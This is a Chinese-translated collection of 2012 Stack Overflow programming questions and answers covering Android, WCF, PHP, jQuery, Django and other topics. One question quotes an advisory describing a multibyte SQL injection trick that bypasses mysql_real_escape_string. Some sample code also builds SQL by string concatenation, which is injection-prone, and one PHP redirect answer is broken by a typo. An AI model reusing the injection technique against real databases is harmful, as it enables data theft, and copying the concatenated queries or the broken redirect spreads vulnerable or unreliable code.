这有效，除非用户在另一个选项卡中打开页面 X 上的链接。即页面 X 仍然打开，但用户已导航到另一个页面和操作 A、B、C 并执行。这不会发生，因为页面 X 仍然打开。

我想知道是否有办法在页面 X 上检测页面关闭，所以我只在页面关闭或卸载时执行操作？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-22T18:39:54.710

您可以使用 jQuery 的`.unload`功能与 ajax post 配对从前端完成此操作。

```
$(window).unload(function() {
 //ajax post to controller action
 $.ajax({
        type: 'POST',
        url: '/Controller/Action',
        data : { param1 : "value1", param2: "value2" },
        dataType: 'html',
        success: //do what needs to be done here, alert?
    });
}); 
```

# android - ContactManager 示例中抛出的 ActivityNotFoundException

> ID：10270721
> 
> 赞同：1
> 
> 时间：2012-04-22T18:16:26.383
> 
> 标签：android, android-intent

我正在尝试使用`ContactManager`来自 Android 开发者网站的 ，当我按下按钮转到`ContactManager`它时，它会关闭并引发异常：

```
throw new ActivityNotFoundException("No Activity found to handle " + intent); 
```

它在下面，`switch(res)`所以我猜它没有连接到`ContactManager`. 这是我的按钮`ContactManager`：

```
Button clas;

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.friends);

    SettingButtons();
    clas.setOnClickListener(this);
}

public void onClick(View v) {
    switch(v.getId()){
        case R.id.TOFRIENDS:
            startActivity(new Intent("com.clayton.calendar.ContactManager"));
            break;
    }
}

private void SettingButtons() {
    clas = (Button) findViewById(R.id.TOFRIENDS);
} 
```

我的`AndroidManifest`文件是：

```
<activity android:name=".ContactManager" android:label="@string/app_name">
    <intent-filter>
        <action android:name="com.clayton.calendar.ContactManager" />
        <category android:name="android.intent.category.Default" />
    </intent-filter>
</activity>

<activity android:name="ContactAdder" android:label="@string/addContactTitle">
</activity> 
```

在`ContactManager`我将包更改为`package com.clayton.calendar`并`AddContact`更改了以下内容：

```
public static final String ACCOUNT_NAME = "com.clayton.calendar.ACCOUNT_NAME";
public static final String ACCOUNT_TYPE = "com.clayton.calendar.ACCOUNT_TYPE"; 
```

里面还有什么我必须改变才能让它工作的吗？我已经浏览了几次代码，我认为我没有遗漏任何东西。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-23T15:29:19.897

`action`标签的和`category`元素的字符串`<intent-filter>`区分大小写，因此不是：

```
<category android:name="android.intent.category.Default" /> 
```

采用：

```
<category android:name="android.intent.category.DEFAULT" /> 
```

# linux - 我在哪里可以获得“setfacl”Linux/Unix 命令的源代码

> ID：10270722
> 
> 赞同：0
> 
> 时间：2012-04-22T18:16:36.420
> 
> 标签：linux, unix, command

该`SETFACL`实用程序设置文件和目录的访问控制列表 (ACL)。

我需要了解`setfacl`命令的源代码。有人可以告诉我在哪里可以买到吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2012-04-22T18:27:46.837

You can download [here](http://git.savannah.nongnu.org/cgit/acl.git/snapshot/acl-2.2.53.tar.gz)

**2020 Edit:** Link is updated

# dependency-injection - 统一维护具体类的单个实例

> ID：10270728
> 
> 赞同：0
> 
> 时间：2012-04-22T18:17:15.030
> 
> 标签：dependency-injection, unity-container, instantiation

使用 unity 时，如果我尝试注入一个我没有在容器中显式注册的具体类型，unity 将尝试定位当前类型并为我实例化一个新类型，然后再将其注入依赖它的类中。

我如何确保只使用这种类型的单个实例？我需要事先在容器中显式注册一个实例吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T20:36:25.290

来自[MSDN](http://msdn.microsoft.com/en-us/library/ff660864%28PandP.20%29.aspx)：

> 您可以使用 Unity 容器生成具有公共构造函数的任何对象的实例（换句话说，您可以使用 new 运算符创建的对象），而无需在容器中注册该类型的映射。当您调用 Resolve 方法并指定未注册类型的默认实例时，容器只需调用该类型的构造函数并返回结果。

简单地说，**是**的，您必须为您的类型注册一个映射，才能在您的应用程序中将其用作单例。您可以使用`RegisterInstance`方法或`RegisterType`提供`ContainerControlledLifetimeManager`作为生命周期管理器来实现它。

# c# - WCF TransactionScope 不回滚

> ID：10270729
> 
> 赞同：1
> 
> 时间：2012-04-22T18:17:25.047
> 
> 标签：c#, transactions, transactionscope, distributed-transactions

**我用过这个 guid：[http](http://www.c-sharpcorner.com/uploadfile/shivprasadk/wcf-faq-part-5-transactions/) ://www.c-sharpcorner.com/uploadfile/shivprasadk/wcf-faq-part-5-transactions/ 为什么它不回滚？我不明白！**

我有一个服务和客户端应用程序，但我不知道这段代码有什么问题。在完美地完成这一行并将其保存在我的数据库中之后，

```
proxy.AddEmployee("Stav", "20"); 
```

下一行抛出异常，因为我没有向 Age 参数发送数字，但事务没有回滚第一行，所以信息：Stav，20 仍然存在于我的数据库中！

```
proxy.AddEmployee("Stav123", "Not a Number(-->will do Exception)") 
```

**编辑 1：** 我添加了 AddEmployee 工具。

客户：

```
static void Main(string[] args)
        {
            ServiceReference1.IJob proxy = new ServiceReference1.JobClient();
            using (TransactionScope ts = new TransactionScope(TransactionScopeOption.Required))
            {
                try
                {
                    proxy.AddEmployee("Stav", "20");
                    proxy.AddEmployee("Stav123", "Not a Number(-->will do Exception) ");//stop the running and show the Exception but keep the stav,20 in DB
                    ts.Complete();
                }
                catch
                {
                    ts.Dispose();
                }
            }
        } 
```

服务：

```
[ServiceContract]
    public interface IJob
    {
        [OperationContract]
        [TransactionFlow(TransactionFlowOption.Allowed)]
        void AddEmployee(string Name, string Age);
    }
public class JobImplement:IJob
    {
        [OperationBehavior(TransactionScopeRequired = true)]
        public void AddEmployee(string Name, string Age)
        {
string strConnection = @"Data Source=.\SQLEXPRESS;AttachDbFilename=C:\Users\stavalfi\Desktop\WCF2\ConsoleApplication4\WCF_DB.mdf;Integrated Security=True;Connect Timeout=30;User Instance=True";
        SqlConnection objConnection = new SqlConnection(strConnection);
        objConnection.Open();
        SqlCommand objCommand = new SqlCommand("INSERT INTO Employee (Name,Age) " + "VALUES ('" + Name + "' ,'" + Age + "')", objConnection);
        objCommand.ExecuteNonQuery();
        objConnection.Close();
        }
    }
static void Main(string[] args)
        {
            WSHttpBinding Basic = new WSHttpBinding();
            Basic.TransactionFlow = true;
            ServiceHost host = new ServiceHost(typeof(JobImplement), new Uri("http://localhost:8080"));
            //
            ServiceMetadataBehavior behavior = new ServiceMetadataBehavior();
            behavior.HttpGetEnabled = true;
            host.Description.Behaviors.Add(behavior);
            //
            host.AddServiceEndpoint(typeof(IJob), new BasicHttpBinding(), "Request123");
            host.Open();
            //
            Console.WriteLine("opened");
            Console.ReadLine();
            //
            host.Close();
        } 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-24T20:38:34.703

看起来您的代码中可能有错字：

```
static void Main(string[] args)         
{             
    ...
    host.AddServiceEndpoint(typeof(IJob), new BasicHttpBinding(), "Request123");   
    ...
} 
```

您正在添加 BasicHttpBinding 类型的端点 - 一种不支持事务的绑定协议。

我认为您实际上是要这样做：

```
static void Main(string[] args)         
{             
    WSHttpBinding Basic = new WSHttpBinding();
    Basic.TransactionFlow = true;  
    ...
    host.AddServiceEndpoint(typeof(IJob), Basic, "Request123");   
    ...
} 
```

这会给你一个 WSHttpBinding 端点——一个支持事务的绑定协议。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2012-04-23T09:29:58.553

您应该实现自己的回滚功能。这是一个基本的方法。在您的**服务**类接口中添加`[ServiceBehavior(InstanceContextMode = InstanceContextMode.PerSession, ConcurrencyMode = ConcurrencyMode.Single)]`属性。然后添加这些代码：

```
private SqlCommand Command { get; set; }

[OperationContract]
public void BeginTransaction()
{
    this.Command = new SqlCommand();
    string strConnection = @"Data Source=.\SQLEXPRESS;AttachDbFilename=C:\Users\stavalfi\Desktop\WCF2\ConsoleApplication4\WCF_DB.mdf;Integrated Security=True;Connect Timeout=30;User Instance=True";
    SqlConnection objConnection = new SqlConnection(strConnection);
    objConnection.Open();
    this.Command.Connection = objConnection;
}

[OperationContract]
public void RollBackTransaction()
{
    this.Command.Transaction.Rollback();
}

[OperationContract]
public void CommitTransaction()
{
    this.Command.Transaction.Commit();
}

[OperationContract]
public void CloseConnection()
{
    this.Command.Connection.Close();
    this.Command = null;
}

[OperationBehavior(TransactionScopeRequired = true)]
public void AddEmployee(string Name, string Age)
{
    this.Command.CommandText = "INSERT INTO Employee (Name,Age) " + "VALUES ('" + Name + "' ,'" + Age + "')";
    this.Command.ExecuteNonQuery();
} 
```

然后您可以像这样在**客户端**代码中访问它：

```
try
{
    proxy.BeginTransaction();
    proxy.AddEmployee("Stav", "20");
    proxy.AddEmployee("Stav123", "Not a Number(-->will do Exception)");
    proxy.CommitTransaction();
}
catch
{
    proxy.RollBackTransaction();
}
finally
{
    proxy.CloseConnection();
} 
```

希望这可以帮助。

# mysql - 多字节 SQL 注入

> ID：10270733
> 
> 赞同：3
> 
> 时间：2012-04-22T18:18:19.977
> 
> 标签：mysql, sql, code-injection, multibyte

我知道，这是经常讨论的问题，但我最近发现[了这个漏洞](http://vigilance.fr/vulnerability/MySQL-SQL-injection-via-multi-byte-characters-5885)，我正在测试我是否能抵抗这种注入，但是我无法模拟这种行为。可能，我不明白他们正在使用的查询。

我感兴趣的部分：

> 第一个漏洞影响不拒绝无效多字节字符的 mysql_real_escape_string() 函数系列。例如，在 UTF-8 中，“0xC8 'attackersql”或“0xC8\'attackersql”字符串被转换为“one_character 'attackersql”（忽略空格）。所以，查询：
> 
> SELECT ... WHERE v = 'mysql_real_escape_string("0xC8 'attackersql") '
> 
> 变得 ：
> 
> SELECT ... WHERE v = '0xC8''attackersql'
> 
> SELECT ... WHERE v = 'one_character 'attackersql'
> 
> 因此，攻击者可以注入attackersql 命令。

这个问题听起来很蹩脚，但**我怎样才能使这种注入工作？**

**注意（已编辑）：**我使用的是 PHP 5.2.6、MySQL 5.0.51a（更正），并且在 DB 连接上设置了字符集 'utf8'。

# php - htaccess 重写在本地主机上不起作用

> ID：10270738
> 
> 赞同：3
> 
> 时间：2012-04-22T18:18:40.660
> 
> 标签：php, apache, .htaccess, mod-rewrite

虽然有很多类似的帖子，但我都阅读了它们都无济于事。让我描述一下我的情况，希望有人可以解决这个问题。我在 /Users/myusername/Sites/domain.com/public_html/.htaccess 中有以下 .htaccess 文件。DocumentRoot 设置为 /Users/myusername/Sites/domain.com/public_html。

```
RewriteEngine on
options +FollowSymLinks

RewriteBase /demo 
RewriteRule ^/demo/evaluate/1$ /demo/evaluate/index.php?eval_id=1 [L] 
```

现在进行设置：

1.  httpd.conf 中的“LoadModule rewrite_module modules/mod_rewrite.so”未注释。
2.  “AllowOverride All”无处不在

htaccess 重定向工作，但由于某种原因，我在错误日志中不断收到以下错误：

```
[Sun Apr 22 11:14:09 2012] [error] [client ::1] File does not exist: /Users/myusername/Sites/domain.com/public_html/demo/evaluate/1 
```

如果您需要更多信息，请告诉我。

* * *

老实说，不知道发生了什么。我没有改变任何东西。

它可能是所有设置和反馈的某种神奇组合。但现在它正在工作。这就像一个纸牌屋，我只是要退后一步去惊叹，直到我不小心再次打破它。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-23T05:47:23.040

尝试将您的 RewriteRule 更改为：

```
RewriteRule ^demo/evaluate/1$ demo/evaluate/index.php?eval_id=1 [NC,QSA,L] 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-06-01T11:35:38.890

你能检查这两行并检查吗

```
RewriteBase /demo 
RewriteRule ^/demo/evaluate/$1 /demo/evaluate/index.php?eval_id=$1 [L] 
```

# jquery - JSF 中的页面卸载事件处理

> ID：10270744
> 
> 赞同：2
> 
> 时间：2012-04-22T18:19:05.007
> 
> 标签：jquery, jsf-2

有没有办法在 JSF 2.0 中处理页面卸载事件？每当用户离开特定页面时，我想执行一些数据重置？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-22T20:53:38.707

没有 100% 可靠的方式来通知服务器端该`unload`事件。根据浏览器的品牌/版本，要么服务器根本无法被 ajax ( `XMLHttpRequest`) 请求命中，要么如果 ajax 请求可以成功完成（因为 ajax 请求被突然中止），您将遇到竞争条件因为选项卡/窗口已关闭，因此您冒着服务器永远不会检索完整 ajax 请求的风险）。

您最好的选择是在服务器端挂钩销毁事件。例如，在`@ViewScoped`bean 的情况下，您只需要创建一个带有注释的方法`@PreDestroy`：

```
@ManagedBean
@ViewScoped
public class Bean {

    @PreDestroy
    public void destroy() {
        // This method is called whenever the view scope has been destroyed.
        // That can happen when the user navigates away by a POST which is
        // invoked on this bean, or when the associated session has expired.
    }

} 
```

或者，也许你根本不需要它。您只需要将数据存储为视图范围 bean 的属性，而不是会话范围 bean。滥用会话范围 bean 的开发人员经常有这种要求；）另请参阅[如何选择正确的 bean 范围？](https://stackoverflow.com/questions/7031885/how-to-choose-the-right-bean-scope/7031941#7031941)

# php - 当用户想尝试时使php页面无法访问

> ID：10270745
> 
> 赞同：-2
> 
> 时间：2012-04-22T18:19:07.287
> 
> 标签：php

如何使我的 php 页面无法被用户访问，我的意思是当尝试键入一些 php 页面时，他们无法访问它，带有一些文本“非常未经授权的页面”，或者只是将其重定向到与 php 页面相关的另一个页面，

像这样： **www.mydomain.com/index.php 变成 www.mydomain.com/home 或 /home.html** **www.mydomain.com/profile.php 变成 www.mydomain.com/profiles** 所以用户只需键入重写页面不是php页面。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T18:26:55.963

```
if (!$isAllowed)
{
    (Redirect them)
} 
```

很简单。

[http://www.instant-web-site-tools.com/html-redirect.html](http://www.instant-web-site-tools.com/html-redirect.html)

和

[http://php.net/manual/en/function.header.php](http://php.net/manual/en/function.header.php)

两者都显示了重定向方法。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T18:26:58.983

您可以使用

`header`用于重定向和`exit`/或`die`停止页面执行

```
$url = "http://www.mydomain.com/home";
$isValidUser = false ;

if(!$isValidUser)
{
    header("Localtion: $url");
} 
```

或者

```
$isValidUser = false ;
if(!$isValidUser)
{
    die("Sorry un authorized page");
} 
```

请参见

[http://php.net/manual/en/function.header.php](http://php.net/manual/en/function.header.php)

[http://php.net/manual/en/function.die.php](http://php.net/manual/en/function.die.php)

[http://php.net/manual/en/function.exit.php](http://php.net/manual/en/function.exit.php)

# jquery - bxSlider jquery 显示随机幻灯片？

> ID：10270746
> 
> 赞同：1
> 
> 时间：2012-04-22T18:19:14.513
> 
> 标签：jquery, ajax, image, slider, bxslider

大家好，我正在使用 jquery bxslider 插件，由于某种原因，它显示随机幻灯片，它不会从一个开始，有时它会多次显示第一张幻灯片，而有些幻灯片永远不会？

我正在使用非常简单的代码，我没有编辑您可以在 viifit.com 上的工作（..working 但随机幻灯片）中看到的 .js 文件

```
<script src="http://code.jquery.com/jquery-latest.js" type="text/javascript"></script>
<script src="jquery.bxSlider.min.js" type="text/javascript"></script>
<script type="text/javascript">
 $(document).ready(function(){
   $('#slider1').bxSlider();
 });

 $(function(){
 var slider = $('#slider1').bxSlider({
  controls: false
 });

 $('#go-prev').click(function(){
 slider.goToPreviousSlide();
 return false;
 });

 $('#go-next').click(function(){
 slider.goToNextSlide();
return false;
 });
});

$(function(){
$('#slider1').bxSlider({
auto: true,
autoControls: false
});
}); 
</script>

<div id="slider1">
<div><img src="slide1.png"></div>
<div><img src="slide2.png"></div>
<div><img src="slide3.png"></div>
<div><img src="slide4.png"></div>
</div> 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T18:32:57.957

你的剧本有很多错误，太疯狂了。

试试这个：

```
$(document).ready(function(){

    var slider = $('#slider1').bxSlider({
        controls: false,
        auto:true,
        autoControls: false
    });

    $('#go-prev').click(function(){
        slider.goToPreviousSlide();
        return false;
    });

    $('#go-next').click(function(){
        slider.goToNextSlide();
        return false;
    });
}); 
```

现在无法在本地测试它，但它应该可以工作。

# java - Java Swing 中的问题

> ID：10270747
> 
> 赞同：0
> 
> 时间：2012-04-22T18:19:23.153
> 
> 标签：java, swing

我创建了一个 Java 程序来将 MAC 地址保存到外部文件。下面是代码：

```
import java.io.*;

public class MAC{

public static void main(String[] args) throws IOException{
   BufferedReader in = new BufferedReader(new InputStreamReader(System.in));
   System.out.print("Enter the MAC Addres : ");
   File file = new File("mac.txt");

   FileWriter fstream = new FileWriter("mac.txt",true);
   BufferedWriter out = new BufferedWriter(fstream);   

   out.write(in.readLine());
   out.newLine();
   out.close();    
   }
} 
```

我还创建了一个 Swing 应用程序。我已经完成了前端，但现在我无法使用 swing 将 MAC 地址保存到外部文件中。

在我的 ActionListener 中，我正在获取值，但我不知道如何将详细信息保存到外部文件中。

我可以将 ActionListener 值打印到屏幕上，但我希望将其保存在外部文件中。

```
 import java.awt.BorderLayout;
    import java.awt.FlowLayout;
    import java.awt.GridLayout;
    import java.awt.event.ActionEvent;
    import java.awt.event.ActionListener;
    import javax.swing.JButton;
    import javax.swing.JFrame;
    import javax.swing.JLabel;
    import javax.swing.JPanel;
    import javax.swing.JTextField;

    import java.io.*;

    public class TextForm extends JPanel {

        private JTextField[] fields;

        // Create a form with the specified labels, tooltips, and sizes.
        public TextForm(String[] labels, int[] widths) {
            super(new BorderLayout());
            JPanel labelPanel = new JPanel(new GridLayout(labels.length, 1));
            JPanel fieldPanel = new JPanel(new GridLayout(labels.length, 1));
            add(labelPanel, BorderLayout.WEST);
            add(fieldPanel, BorderLayout.CENTER);
            fields = new JTextField[labels.length];

            for (int i = 0; i < labels.length; i += 1) {
                fields[i] = new JTextField();
                if (i < widths.length)
                    fields[i].setColumns(widths[i]);

               JLabel lab = new JLabel(labels[i], JLabel.RIGHT);
               lab.setLabelFor(fields[i]);

                labelPanel.add(lab);
                JPanel p = new JPanel(new FlowLayout(FlowLayout.LEFT));
                p.add(fields[i]);
                fieldPanel.add(p);
            }
    }

        public String getText(int i) {
            return (fields[i].getText());
        }

        public static void main(String[] args) {
            String[] labels = { "Enter MAC Address : "};
            int[] widths = { 17 };
            final TextForm form = new TextForm(labels, widths);
            JButton submit = new JButton("Submit");
            submit.addActionListener(new ActionListener() {

                public void actionPerformed(ActionEvent e) {
                    System.out.println(form.getText(0));

                }
            });

            JFrame f = new JFrame("Text Form Example");
            f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
            f.getContentPane().add(form, BorderLayout.NORTH);
            JPanel p = new JPanel();
            p.add(submit);
            f.getContentPane().add(p, BorderLayout.SOUTH);
            f.pack();
            f.setVisible(true);
        }
    } 
```

谢谢你。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-04-22T18:32:04.937

将工作方法复制到`actionPerformed`方法中并交换。

```
out.write(in.readLine()); 
```

为了：

```
out.write(form.getText(0)); 
```

然后将其中的大部分包裹在`try`/`catch`中。

# django - django-mptt：.move_to 在测试运行器中不起作用

> ID：10270749
> 
> 赞同：3
> 
> 时间：2012-04-22T18:19:46.450
> 
> 标签：django, unit-testing, move, mptt

.move_to() 方法对我不起作用。我查看了人们建议保存实例以及重新加载节点实例的其他帖子。但是这些解决方案都不适用于这个测试用例。我也尝试过 ._tree_manager.rebuild()，它也不起作用。我的测试代码如下：

```
def test_reorder_pages(self):
    p = Page.objects.get(slug='page-1')
    p2 = Page.objects.get(slug='page-2')

    self.assertEqual(1, p.lft)
    self.assertEqual(3, p2.lft)

    p2.move_to(p, 'left')

    p = Page.objects.get(slug='page-1')
    p2 = Page.objects.get(slug='page-2')

    ## Values should now be reversed
    self.assertEqual(3, p.lft)
    self.assertEqual(1, p2.lft) 
```

基本上我期望发生的是第 2 页被放置在第 1 页的“之前”（在...的左侧）。但是最后两个断言失败了。我还检查了所有其他值（lft、rght、level、tree_id），*但*它们都没有改变。

有谁知道我做错了什么？

**编辑：**在 mossplix 的建议下，我再次尝试了 Page.tree.rebuild() 。这仍然不起作用，但我确实注意到了一个奇怪的行为。在 move_to() 之前，这些测试将通过：

```
 self.assertEqual(0, p.level)
    self.assertEqual(1, p.lft)
    self.assertEqual(2, p.rght)
    self.assertEqual(1, p.tree_id)

    self.assertEqual(0, p2.level)
    self.assertEqual(3, p2.lft)
    self.assertEqual(4, p2.rght)
    self.assertEqual(1, p.tree_id) 
```

在**move_to()**和**rebuild()**之后，我期待的是：

```
 self.assertEqual(0, np.level)
    self.assertEqual(3, np.lft)
    self.assertEqual(4, np.rght)
    self.assertEqual(1, p.tree_id)

    self.assertEqual(0, np2.level)
    self.assertEqual(1, np2.lft)
    self.assertEqual(2, np2.rght)
    self.assertEqual(1, p.tree_id) 
```

然而，上面的测试失败了，仔细检查后，两个页面现在对于所有这些属性（lft、rght、level、tree_id）都有相同的值。这肯定是错误的，因为这意味着它们在树中占据完全相同的位置？

**最新更新：** 似乎使用 runserver，动作完美。我遇到的问题似乎与测试框架有关。我尝试使用 TransactionTestCase 但这也没有解决问题。更新了标题以反映它与测试有关。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-22T19:41:31.293

您可能需要明确调用

```
Page.tree.rebuild()
```

移动节点后

# postgresql - 尝试安装 PostStat，一个在 Postgres 中添加统计功能的库

> ID：10270750
> 
> 赞同：0
> 
> 时间：2012-04-22T18:19:49.880
> 
> 标签：postgresql, gcc, statistics, fortran, debian

我正在尝试在 debian 挤压上安装 Poststat。 [http://poststat.projects.postgresql.org](http://poststat.projects.postgresql.org) 这个项目看起来不太老（2008 年），但我在安装它时遇到了一些困难。虽然看起来是个很有意思的项目，但是google是空的。我会在这里尝试总结一下我所做的（安装了postgres 8.4）：

```
apt-get install fort77 postgresql-server-dev-8.4 libblas-dev liblapack-dev gfortran 
```

首先，按照官网上的说法，解压tar.gz，进入f77stat目录，然后'make'。

然后，如果您安装了 libpq-dev，则在 debian 挤压上它还会在 /usr/bin/ 中安装它自己的 pg_config，它会报告错误信息。（参见[http://postgresql.1045698.n5.nabble.com/Bug-report-Wrong-version-in-pg-config-td2123792.html](http://postgresql.1045698.n5.nabble.com/Bug-report-Wrong-version-in-pg-config-td2123792.html)）一种解决方案：

```
 mv /usr/bin/pg_config pg_config_bak
 ln -s /usr/lib/postgresql/8.4/bin/pg_config pg_config 
```

这很重要，因为 Poststat 的 makefile 正在使用 pg_config 检索一些信息。

然后在主 Makefile 中有一行：

```
-lblas -llapack -lg2c 
```

为 blas 和 lapack 安装这些软件包：

```
apt-get install libatlas-base-dev libatlas-dev libatlas-doc libatlas3gf-base 
```

现在我的问题是关于g2c。根据谷歌，g2c 已过时，所以我编辑了 Makefile 并将 -lg2c 替换为 -lgfortrant

最后一步：在我的数据库中编译和导入新的统计函数。

```
make && sudo make install
psql -f poststat.sql <database> 
```

可悲的是，

```
psql:poststat.sql:18: ERROR: unable to load the library 
 « /usr/lib/postgresql/8.4/lib/poststat.so » : /usr/lib/postgresql/8.4/lib/poststat.so:
undefined symbol: s_stop 
```

任何想法 ？fortran 不是我的世界，并且软件包在 debian 中似乎对 fortran 发生了很大变化。我从 -lg2c 切换到 -lgfortrant 可能是错误的。实际上，删除此包含最终会产生相同的错误。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-22T19:34:18.520

libg2c 属于 g77 (http://stackoverflow.com/questions/2406581/what-is-libg2c-library)，它已经过时且不受支持多年。切换到更新的编译器涉及的不仅仅是替换这个库。您还需要更换编译器，例如 gfortran。您可能需要更改 gfortran 的默认编译器选项才能编译 FORTRAN 77 代码。我使用：-O2 -fixed-form -fixed-line-length-none。如果使用 gfortran 作为链接器，则不需要显式包含 fortran 运行时库。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T22:18:16.523

将 -lg2c 更改为 -lf2c

添加到 poststat.c ，最后

```
int MAIN__(){
   return (0);
} 
```

# iphone - MapKit：如何将完全相同的投影转移到形状略有不同的新实例上？

> ID：10270751
> 
> 赞同：0
> 
> 时间：2012-04-22T18:19:58.990
> 
> 标签：iphone, ipad, mapkit, zooming, region

好的，这是交易：

我有两种观点：简单和高级。在 iPad 上，它们带有一个大地图视图，带有一个可以移动以指示位置的标记。

每个视图都有一个不同的 MkMapView 实例。当我从一个切换到另一个时，我希望将地图保持在完全相同的位置和缩放级别，以便用户感觉就像是同一张地图。

但是，每个视图的地图视图的形状略有不同。这是因为高级搜索在地图上方有更多内容。

当我打开地图（这是来自抽象超类的代码，所以两个实例都得到它）时，我设置了区域和标记位置，如下所示：

```
[mapSearchView setRegion:[mapSearchView regionThatFits:[[BMLTAppDelegate getBMLTAppDelegate] searchMapRegion]]];
[myMarker setCoordinate:[[BMLTAppDelegate getBMLTAppDelegate] searchMapMarkerLoc]]; 
```

searchMapRegion 和 searchMapMarkerLoc 是静态的，反映了当前显示的地图的区域和标记位置（地图的中心）。

这是问题所在：

因为地图的形状略有不同，所以总会有一些调整。这可以来回“弹跳”，因此每次切换时地图缩放都会不断减小，直到您看到整个世界。

我是否使用 regionThatFits 并不重要。即使使用以下代码，也会发生同样的事情：

```
[mapSearchView setRegion:[[BMLTAppDelegate getBMLTAppDelegate] searchMapRegion]];
[myMarker setCoordinate:[[BMLTAppDelegate getBMLTAppDelegate] searchMapMarkerLoc]]; 
```

我想要的只是显示完全相同的缩放和中心。我不在乎高级视图是否有点切断。

我如何获得 $#@!! MapKit 停止调整缩放系数？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-06-06T20:05:55.430

仅供参考。我通过创建一个自定义模型层类来解决这个问题，该类维护比例和中心点，并被多个 MKMapViews 使用。它工作得很好，但 MapKit 有时会稍微调整比例以适应它的“定位器”之一。

# android - 如何从膨胀的布局中访问视图？

> ID：10270754
> 
> 赞同：4
> 
> 时间：2012-04-22T18:20:40.283
> 
> 标签：android, android-layout, layout-inflater

我有一个附有 main.xml 的简单 Activity。main.xml 有一个自定义布局 (customLinearLayout) 和一个简单的 TextView。自定义布局也有自己的布局文件 (linearlayout.xml) 和一个简单的按钮。布局由类正确膨胀。

linearlayout.xml 中的 Button 将更改位于 main.xml 中的 textView 的文本，但我无法访问该 textView。我究竟做错了什么？我也不能膨胀 main.xml。

这是自定义线性布局：

```
public class CustomLinearLayout extends LinearLayout {

LayoutInflater mInflater;
View ContainerView;

Button button1;
TextView tv;

public CustomLinearLayout(Context context) {
    super(context);
    // TODO Auto-generated constructor stub
    init();
}

public CustomLinearLayout(Context context, AttributeSet attrs) {
    super(context, attrs);
    // TODO Auto-generated constructor stub
    init();
}

private void init() {
    mInflater = (LayoutInflater) getContext().getSystemService(Context.LAYOUT_INFLATER_SERVICE);
    ContainerView = mInflater.inflate(R.layout.linearlayout, this, true);

    button1 = (Button) ContainerView.findViewById(R.id.button1);

    // trying to get the TextView from main.xml
    tv = (TextView) ContainerView.findViewById(R.id.textview1); // doesn't work

    // these tries doesn't work either
    //tv = (TextView) ContainerView.getRootView().findViewById(R.id.textview);  
    //tv = (TextView) this.getRootView().findViewById(R.id.textview);
    //tv = (TextView) this.findViewById(R.id.textview);

    button1.setOnClickListener(new Button.OnClickListener() {
        public void onClick(View v) {
            // TODO Auto-generated method stub
            if(tv != null)
                tv.setText("works");
            else
                Log.d("CustomLinearLayout", "TextView not found");
        }
    });
}
} 
```

布局文件（linearlayout.xml）：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="match_parent"
android:layout_height="match_parent"
android:orientation="vertical" >

<Button
    android:id="@+id/button1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content"
    android:text="press" />

</LinearLayout> 
```

活动：

```
public class TestLayoutViewsv2Activity extends Activity {
/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.main);
}
} 
```

Activity 的 main.xml：

```
<?xml version="1.0" encoding="utf-8"?>
<LinearLayout xmlns:android="http://schemas.android.com/apk/res/android"
android:layout_width="fill_parent"
android:layout_height="fill_parent"
android:orientation="vertical" >

<test.layoutviewsv2.CustomLinearLayout
    android:layout_width="wrap_content"
    android:layout_height="wrap_content" />

<TextView
    android:id="@+id/textview1"
    android:layout_width="wrap_content"
    android:layout_height="wrap_content" />

</LinearLayout> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-22T18:31:18.270

该方法`findViewById`是有范围的 - 您的自定义视图正在其自身内部查找不存在的文本字段。但没关系！你的观点应该是他们自己的小世界——他们不需要知道任何关于自身之外的世界的事情。可悲的是，您必须更改您的设计以适应这一点（可能就像回调活动一样），以使其做您想做的事情。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-22T18:30:24.533

您以错误的方式使用了 inflate 方法。如果您正在扩展视图，则没有必要为布局充气。inflate 方法用于初始化新视图，无需自己创建新实例。我没有得到你想要做的事情，但你可以使用包含来重用你的一些布局。检查此以获取更多信息[http://developer.android.com/resources/articles/layout-tricks-merge.html](http://developer.android.com/resources/articles/layout-tricks-merge.html)

# android - 制作将视频流式传输到 Blackberry Playbook 的应用程序？

> ID：10270759
> 
> 赞同：0
> 
> 时间：2012-04-22T18:20:49.847
> 
> 标签：android

我正在尝试开发一个将视频从网站流式传输到应用程序的应用程序。所以，这就像在应用程序中观看这些视频，而不是在网站上。你会怎么做？有人可以指点我一个教程或向我解释吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-23T05:44:27.753

这取决于您正在开发的框架。如果您想要真正的答案，您需要提供更多信息。例如，如果您使用本机 sdk 为 playbook (C/C++) 开发，可以在此处找到有关流式视频的信息： [https](https://bdsc.webapps.blackberry.com/native/documentation/video_playback_overview_1935223_11.html) : //bdsc.webapps.blackberry.com/native/documentation/video_playback_overview_1935223_11.html不是专门用于流媒体，而是一个开始。

